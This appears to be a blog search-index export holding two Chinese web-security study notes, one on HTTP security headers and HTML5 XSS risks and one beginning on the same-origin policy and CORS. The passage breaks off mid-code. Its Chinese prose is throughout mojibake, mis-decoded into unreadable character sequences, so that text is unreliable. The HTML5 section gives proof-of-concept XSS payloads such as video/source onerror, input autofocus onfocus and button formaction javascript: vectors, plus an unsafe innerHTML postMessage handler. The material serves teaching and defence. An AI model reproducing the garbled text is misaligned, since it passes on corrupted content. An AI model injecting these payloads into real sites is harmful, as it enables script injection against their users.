ALLOW-FROM URL</span><br></pre></td></tr></table></figure><p>ç›®å‰å·²ç»è¢«CSPå–ä»£ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: frame-ancestors &apos;none&apos;;</span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: frame-ancestors &apos;self&apos;;</span><br></pre></td></tr></table></figure><h2 id="X-XSS-Protection"><a href="#X-XSS-Protection" class="headerlink" title="X-XSS-Protection"></a>X-XSS-Protection</h2><p>ç”¨äºé˜²å¾¡åå°„å‹XSSï¼Œé»˜è®¤é…ç½®ä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-XSS-Protection: 1</span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºå¼€å¯XSSé˜²å¾¡ï¼Œ0è¡¨ç¤ºå…³é—­ã€‚</p><h2 id="HSTS"><a href="#HSTS" class="headerlink" title="HSTS"></a>HSTS</h2><p>HSTSæŒ‡ç¤ºæµè§ˆå™¨å¼ºåˆ¶ä½¿ç”¨HTTPSï¼Œå®ƒçš„å¤´éƒ¨ä¸ºStrict-Transport-Security</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Strict-Transport-Security: &lt;max-age=31536000&gt;[; includeSubDomains][; preload]</span><br></pre></td></tr></table></figure><p><code>max-age</code>æŒ‡HSTSçš„è¿‡æœŸæ—¶é—´ï¼Œé€šå¸¸æ˜¯ä¸€å¹´</p><p><code>includeSubDomains</code>æŒ‡å½“å‰åŸŸåå’Œå­åŸŸåå‡å¼€å¯HSTS</p><p><code>preload</code>æŒ‡ç”³è¯·å°†è¯¥åŸŸååŠ å…¥æµè§ˆå™¨å†…ç½®åˆ—è¡¨ä¸­ï¼Œä»¥åçš„æ‰€æœ‰è®¿é—®éƒ½å°†ä½¿ç”¨httpsé“¾æ¥ï¼ˆå¯ä»¥åœ¨<a href="https://hstspreload.org/ä¸Šçœ‹ï¼‰" target="_blank" rel="noopener">https://hstspreload.org/ä¸Šçœ‹ï¼‰</a></p><p>è¯¦ç»†è§£é‡Šä¸€ä¸‹ï¼Œè‹¥ä¸åŠ HSTSï¼Œé‚£ä¹ˆç”¨æˆ·çš„è®¿é—®æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/HTTP-HTTPåè®®å¤ä¹ /1549094565896.png" alt="1549094565896"></p><p>å› æ­¤æ”»å‡»è€…å¯ä»¥å±•å¼€ä¸­é—´äººæ”»å‡»ï¼š</p><p><img src="/HTTP-HTTPåè®®å¤ä¹ /1549094607660.png" alt="1549094607660"></p><p>ä½¿ç”¨HSTSé˜²å¾¡åç”¨æˆ·å¯ä»¥é˜²å¾¡è¯¥æ”»å‡»ï¼š</p><p><img src="/HTTP-HTTPåè®®å¤ä¹ /1549094654080.png" alt="1549094654080"></p><h2 id="HPKP"><a href="#HPKP" class="headerlink" title="HPKP"></a>HPKP</h2><p>ä¸ºäº†é˜²æ­¢CAæ‚„æ‚„ä¿®æ”¹è¯ä¹¦å†…å®¹ï¼ŒæœåŠ¡å™¨å¯ä»¥å°†è‡ªå·±å…¬é’¥å¡«åœ¨HTTPå¤´ä¸­ï¼Œè®©æµè§ˆå™¨æ ¸å¯¹å…¶ä¸è¯ä¹¦æ˜¯å¦ä¸€è‡´ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Public-Key-Pins: pin-sha256=&quot;base64==&quot;; max-age=expireTime [; includeSubdomains][; report-uri=&quot;reportURI&quot;]</span><br></pre></td></tr></table></figure></p><h2 id="Referrer-Policy"><a href="#Referrer-Policy" class="headerlink" title="Referrer-Policy"></a>Referrer-Policy</h2><p><code>Referer: A.com</code> æŒ‡è·³è½¬æ¥è‡ªA.com<br>é»˜è®¤æƒ…å†µä¸‹ï¼Œåªè¦å‘ç”Ÿè·³è½¬ï¼Œæµè§ˆå™¨å°±ä¼šè‡ªåŠ¨æ·»åŠ refererå¤´ï¼ŒæœåŠ¡å™¨å¯ä»¥ç”¨<code>referer-prolicy</code>æŒ‡å®šä¸ºå…¶ä»–ï¼š</p><div class="table-container"><table><thead><tr><th>å€¼</th><th>ä»‹ç»</th></tr></thead><tbody><tr><td>ç©º</td><td>Policyæœªè®¾ç½®</td></tr><tr><td>no-referrer</td><td>ä»»ä½•æƒ…å†µä¸‹éƒ½ä¸å‘é€referer</td></tr><tr><td>no-referrer-when-downgrade</td><td>httpsè‡³httpæ—¶ä¸å‘é€referer</td></tr><tr><td>origin</td><td>ä»…å‘é€protocal://hostéƒ¨åˆ†</td></tr><tr><td>origin-when-cross-origin</td><td>è·¨åŸŸæ—¶å‘é€origin</td></tr><tr><td>same-origin</td><td>åŒæºæ—¶å‘é€</td></tr><tr><td>strict-origin</td><td>åŒæ–¹originç›¸åŒä¸”å®‰å…¨ç­‰çº§ç›¸åŒ</td></tr><tr><td>unfafe-url</td><td>ä»»ä½•æƒ…å†µä¸‹éƒ½å‘é€å®Œæ•´referer</td></tr></tbody></table></div><h2 id="å…³äºè¯·æ±‚IP"><a href="#å…³äºè¯·æ±‚IP" class="headerlink" title="å…³äºè¯·æ±‚IP"></a>å…³äºè¯·æ±‚IP</h2><ul><li><p><code>Client-IP</code>ï¼š</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client-IP: 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p><code>X-Forwarded-For</code>ï¼š</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: client1, proxy1, proxy2, proxy3</span><br></pre></td></tr></table></figure></li><li><p><code>X-Originating-IP</code>:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br></pre></td></tr></table></figure></li><li><p><code>X-Remote-Addr</code>:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Remote-Addr: 127.0.0.1</span><br></pre></td></tr></table></figure></li></ul><p>å¯ä»¥çœ‹åˆ°è¿™å››ä¸ªè¯·æ±‚åŒ…å¤´éƒ½æ˜¯å¯ä»¥ä¼ªé€ çš„ï¼Œæ‰€ä»¥è¿˜æ˜¯é€šè¿‡æºIPæ¥ç›´æ¥è·å–ä¸»æœºIPä¸ºå¥½ï¼Œè¿™é‡Œç»™å‡ºPHPçš„å®ç°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span></span><br></pre></td></tr></table></figure><h2 id="Cookies"><a href="#Cookies" class="headerlink" title="Cookies"></a>Cookies</h2><p>æœåŠ¡å™¨ä½¿ç”¨<code>Set-Cookie</code>è®¾ç½®Cookie<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: id=a3fWa; [Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly]</span><br></pre></td></tr></table></figure></p><ul><li><p><code>Expires</code>ï¼šæŒ‡Cookieçš„è¿‡æœŸæ—¶é—´</p></li><li><p><code>Domain=mozilla.org</code>ï¼šCookieä½œç”¨äº<code>mozilla.org</code>åŠå…¶å­åŸŸå</p></li><li><p><code>Secure</code>ï¼šCookieåªèƒ½é€šè¿‡HTTPSå‘é€ç»™æœåŠ¡ç«¯</p></li><li><p><code>HttpOnly</code>ï¼šCookieä¸èƒ½è¢«jsè°ƒç”¨</p><p>æ³¨æ„Cookieçš„å±æ€§å³æ˜¯æŒ‡é”®å€¼å¯¹ï¼Œè¿‡æœŸæ—¶é—´å’Œä½œç”¨åŸŸã€‚</p></li></ul><h2 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h2><p>ä¸CSPæœ‰å…³çš„headerè¯·å‚è€ƒ<a href="http://anemone.top/HTTP-%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5CSP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">å†…å®¹å®‰å…¨ç­–ç•¥CSPå­¦ä¹ ç¬”è®°</a>ä¸€æ–‡ã€‚</p><h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>ä¸CORSæœ‰å…³çš„å¤´éƒ¨æœ‰<code>origin</code>,<code>access-control-</code>ç­‰ï¼Œè¯¦ç»†æˆ‘ä¼šå¦å¼€ä¸€ç¯‡æ–‡ç« ã€‚</p><h1 id="HTML5"><a href="#HTML5" class="headerlink" title="HTML5"></a>HTML5</h1><p>httpåè®®çš„bodyéƒ¨åˆ†æ ¼å¼ä¸»è¦ä¸ºHTMLï¼Œè€Œæ–°å¼•å…¥çš„HTML5ä¸­åŒæ—¶å¼•å…¥äº†å¾ˆå¤šå®‰å…¨æ€§é—®é¢˜ï¼š</p><h2 id="CORSçš„å®‰å…¨æ€§é—®é¢˜"><a href="#CORSçš„å®‰å…¨æ€§é—®é¢˜" class="headerlink" title="CORSçš„å®‰å…¨æ€§é—®é¢˜"></a>CORSçš„å®‰å…¨æ€§é—®é¢˜</h2><p>è¯¦è§å¦ä¸€ç¯‡æ–‡ç« </p><h2 id="æ–°æ ‡ç­¾å¸¦æ¥æ–°çš„XSSæœºä¼š"><a href="#æ–°æ ‡ç­¾å¸¦æ¥æ–°çš„XSSæœºä¼š" class="headerlink" title="æ–°æ ‡ç­¾å¸¦æ¥æ–°çš„XSSæœºä¼š"></a>æ–°æ ‡ç­¾å¸¦æ¥æ–°çš„XSSæœºä¼š</h2><ul><li><p>video</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span>&gt;</span> <span class="tag">&lt;<span class="name">source</span> <span class="attr">onerror</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>ç±»ä¼¼çš„æ ‡ç­¾è¿˜æœ‰<code>audio</code>ã€<code>input</code>ã€<code>select</code>ã€<code>textarea</code>ã€<code>keygen</code>ç­‰ã€‚</p></li></ul><h3 id="æ–°å±æ€§"><a href="#æ–°å±æ€§" class="headerlink" title="æ–°å±æ€§"></a>æ–°å±æ€§</h3><ul><li><p>onfocus</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>formaction</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">formaction</span>=<span class="string">"javascript:alert(1)"</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>onscroll</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onscroll</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ›´å¤šå¯æŸ¥çœ‹ï¼š<a href="http://html5sec.org/" target="_blank" rel="noopener">HTML5 æ ‡ç­¾å®‰å…¨</a></p></li></ul><h2 id="Web-Worker"><a href="#Web-Worker" class="headerlink" title="Web Worker"></a>Web Worker</h2><p>jsçš„å¤šçº¿ç¨‹æ”¯æŒä¸ºæ–°çš„åƒµå°¸ç½‘ç»œæˆ–æŒ–çŸ¿è„šæœ¬ æä¾›æœºä¼šï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">"worker.js"</span>);</span><br></pre></td></tr></table></figure><h3 id="PostMessage"><a href="#PostMessage" class="headerlink" title="PostMessage"></a>PostMessage</h3><p>postmessageå¯èƒ½ä¼šå¯¼è‡´æ–°çš„XSSæ”»å‡»ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">"worker.js"</span>);</span><br><span class="line">worker.postMessage(<span class="string">"hello world"</span>);</span><br><span class="line">worker.onmessage = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">"test"</span>).innerHTML = e.data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h1><ul><li>HTTP, <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/HTTP</a></li><li>Whitepaper: HTTP Security Headers and How They Work, <a href="https://www.netsparker.com/whitepaper-http-security-headers/#XFrameOptionsHTTPHeader" target="_blank" rel="noopener">https://www.netsparker.com/whitepaper-http-security-headers/#XFrameOptionsHTTPHeader</a></li><li>HSTSè¯¦è§£ï¼Œ<a href="https://www.jianshu.com/p/caa80c7ad45c" target="_blank" rel="noopener">https://www.jianshu.com/p/caa80c7ad45c</a></li><li>HTML5 å®‰å…¨é—®é¢˜è§£æ, <a href="https://segmentfault.com/a/1190000003756563" target="_blank" rel="noopener">https://segmentfault.com/a/1190000003756563</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨-HTTP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTP </tag>
            
            <tag> åè®®å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPçš„è®¿é—®æ§åˆ¶ä¸è·¨åŸŸèµ„æºå…±äº«ï¼ˆCORSï¼‰</title>
      <link href="/HTTP-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/HTTP-%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%ABCORS%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p><strong>æœ¬æ–‡é¦–æ¬¡å‘è¡¨åœ¨Freebufï¼š<a href="https://www.freebuf.com/articles/web/195925.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/195925.html</a></strong></p><h1 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h1><p>å‡†ç¡®çš„è¯´ï¼ŒåŒæºç­–ç•¥æ˜¯æŒ‡ï¼Œæµè§ˆå™¨å†…éƒ¨åœ¨å‘èµ·å¦‚ä¸‹è¯·æ±‚æ—¶ï¼Œè¯¥æ¥æºå¿…é¡»æ˜¯å½“å‰åŒæºçš„HTTPèµ„æºï¼š</p><ol><li>ä»¥è·¨ç«™ç‚¹çš„æ–¹å¼è°ƒç”¨XMLHttpRequestæˆ–è€…Fetch APIã€‚</li><li>Webå­—ä½“ï¼ˆç”¨äºCSSä¸­@ font-faceçš„è·¨åŸŸå­—ä½“ä½¿ç”¨ï¼‰</li><li>WebGL textures</li><li>ä½¿ç”¨drawImageç»˜åˆ¶åˆ°canvasçš„å›¾åƒ/è§†é¢‘å¸§ã€‚</li><li>æ ·å¼è¡¨ï¼ˆç”¨äºCSSOMè®¿é—®ï¼‰</li></ol><a id="more"></a><p>æ³¨æ„ï¼šä¸¤ä¸ªURIåŒæºå½“ä¸”ä»…å½“å®ƒä»¬çš„<code>åè®®://host:port</code>ç›¸åŒã€‚</p><p>ä»ç¬¬ä¸€ç‚¹å¯ä»¥çœ‹åˆ°ï¼Œæµè§ˆå™¨é™åˆ¶ä»<strong>è„šæœ¬å†…éƒ¨</strong>å‘èµ·è·¨åŸŸçš„HTTPè¯·æ±‚â€”â€”æ›´å‡†ç¡®çš„è¯´ï¼ŒåŒæºç­–ç•¥æœ‰çš„é™åˆ¶æœ‰ä¸¤ç§è¡¨ç°ï¼šï¼ˆ1ï¼‰é™åˆ¶å‘èµ·AJAXè¯·æ±‚(XMLHttpRequestï¼ŒFetch)ï¼›ï¼ˆ2ï¼‰æ‹¦æˆªå…¶ä»–è·¨ç«™è¯·æ±‚çš„è¿”å›ç»“æœï¼›è¿™å–å†³äºè¯·æ±‚æ˜¯å¦ä¸ºç®€å•è¯·æ±‚ã€‚</p><h1 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h1><p>è·¨åŸŸèµ„æºå…±äº«ï¼ˆCross-Origin Resource Sharing, CORSï¼‰æ˜¯ä¸€ç§è§£å†³è·¨åŸŸè¯·æ±‚çš„æ–¹æ¡ˆï¼Œå…¶æœºåˆ¶æ˜¯ä½¿ç”¨ä¸€ç»„é¢å¤–å“åº”å¤´ï¼ˆAccess-Control-Allow-Originï¼‰å’Œé¢„æ£€è¯·æ±‚(OPTIONS)æ¥ä½¿æµè§ˆå™¨æœ‰æƒä½¿ç”¨éåŒæºèµ„æºã€‚å¤§éƒ¨åˆ†çš„ç°ä»£æµè§ˆå™¨ç¬¦åˆè¯¥æ ‡å‡†ã€‚</p><h1 id="ç®€å•è¯·æ±‚"><a href="#ç®€å•è¯·æ±‚" class="headerlink" title="ç®€å•è¯·æ±‚"></a>ç®€å•è¯·æ±‚</h1><p>è‹¥è¯·æ±‚æ»¡è¶³æ‰€æœ‰ä¸‹è¿°æ¡ä»¶ï¼Œåˆ™è¯¥è¯·æ±‚å¯è§†ä¸ºâ€œç®€å•è¯·æ±‚â€ï¼š</p><ul><li><p>ä½¿ç”¨ä¸‹åˆ—æ–¹æ³•ä¹‹ä¸€ï¼š</p><ul><li>GET</li><li>HEAD</li><li>POST</li></ul></li><li><p>å¹¶ä¸”<code>Content-Type</code>çš„å€¼ä»…é™äºä¸‹åˆ—ä¸‰è€…ä¹‹ä¸€ï¼š</p><ul><li>text/plain</li><li>multipart/form-data</li><li>application/x-www-form-urlencoded</li></ul></li><li><p>Fetch è§„èŒƒå®šä¹‰äº†å¯¹ CORS å®‰å…¨çš„é¦–éƒ¨å­—æ®µé›†åˆï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸å¾—æ‰‹åŠ¨è®¾ç½®é™¤ä»¥ä¸‹é›†åˆä¹‹å¤–çš„å­—æ®µï¼ˆå¦åˆ™ä¸ä¸ºç®€å•è¯·æ±‚ï¼‰ã€‚è¯¥é›†åˆä¸ºï¼š</p><ul><li>Accept</li><li>Accept-Language</li><li>Content-Language</li><li>Content-Type</li><li>DPR</li><li>Downlink</li><li>Save-Data</li><li>Viewport-Width</li><li>Width</li></ul></li><li><p>å¹¶ä¸”è¯·æ±‚ä¸­çš„ä»»æ„<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequestUpload" target="_blank" rel="noopener"><code>XMLHttpRequestUpload</code></a> å¯¹è±¡å‡æ²¡æœ‰æ³¨å†Œä»»ä½•äº‹ä»¶ç›‘å¬å™¨ï¼›<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequestUpload" target="_blank" rel="noopener"><code>XMLHttpRequestUpload</code></a> å¯¹è±¡å¯ä»¥ä½¿ç”¨ <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/upload" target="_blank" rel="noopener"><code>XMLHttpRequest.upload</code></a> å±æ€§è®¿é—®ã€‚</p></li><li><p>å¹¶ä¸”è¯·æ±‚ä¸­æ²¡æœ‰ä½¿ç”¨ <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/ReadableStream" target="_blank" rel="noopener"><code>ReadableStream</code></a> å¯¹è±¡ã€‚</p></li></ul><p>ç®€å•è¯·æ±‚ä¼šç›´æ¥å‘é€è¯·æ±‚è€Œä¸ä¼šè§¦å‘é¢„è¯·æ±‚ï¼Œä½†æ˜¯ä¸ä¸€å®šèƒ½æ‹¿åˆ°ç»“æœï¼Œè¿™å–å†³äºè¯·æ±‚çš„æœåŠ¡å™¨Responseçš„<code>Access-Control-Allow-Origin</code>å†…å®¹ã€‚æ³¨æ„ä»¥ä¸Šæ¡ä»¶åªè¦æœ‰ä¸€æ¡ä¸æ»¡è¶³åˆ™ä¸ä¸ºç®€å•è¯·æ±‚ã€‚</p><h2 id="ç®€å•è¯·æ±‚è·¨åŸŸè¡¨ç°"><a href="#ç®€å•è¯·æ±‚è·¨åŸŸè¡¨ç°" class="headerlink" title="ç®€å•è¯·æ±‚è·¨åŸŸè¡¨ç°"></a>ç®€å•è¯·æ±‚è·¨åŸŸè¡¨ç°</h2><p>å‘èµ·è¯·æ±‚æœåŠ¡<a href="http://127.0.0.1:8000/ajax.htmlï¼š" target="_blank" rel="noopener">http://127.0.0.1:8000/ajax.htmlï¼š</a></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>AJAX<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">submitRequest</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    xhr.open(<span class="string">"GET"</span>, <span class="string">"http://127.0.0.1:8888/get"</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="javascript">    xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">    xhr.send();</span><br><span class="line"><span class="javascript">    xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">        if(xhr.readyState === 4 &amp;&amp; xhr.status === 200)&#123;</span><br><span class="line">            alert(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"submitRequest()"</span>&gt;</span>AJAX<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>éåŒæºæœåŠ¡<a href="http://127.0.0.1:8888/ï¼š" target="_blank" rel="noopener">http://127.0.0.1:8888/ï¼š</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 